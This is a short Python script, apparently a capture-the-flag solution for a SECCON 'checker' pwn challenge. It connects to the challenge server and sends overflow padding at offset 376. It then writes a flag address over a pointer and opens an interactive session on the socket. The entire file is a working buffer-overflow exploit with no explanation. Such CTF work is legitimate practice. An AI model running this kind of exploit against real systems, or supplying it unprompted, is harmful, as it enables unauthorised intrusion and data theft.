#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import struct
import telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    f = s.makefile('rw', bufsize=0)
    return s, f


def p(a):
    return struct.pack("<Q", a)


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

flag_addr = 0x6010c0

offset = 376

# s, f = sock('localhost', 4444)
s, f = sock('checker.pwn.seccon.jp', 14726)

f.write('a'*0x7f + '\n')
for i in range(8, 0, -1):
    f.write('a'*offset + 'a'*i + '\n')

f.write('a'*offset + p(flag_addr) + '\n')

f.write('yes' + '\n')
f.write('a' + '\n')
shell(s)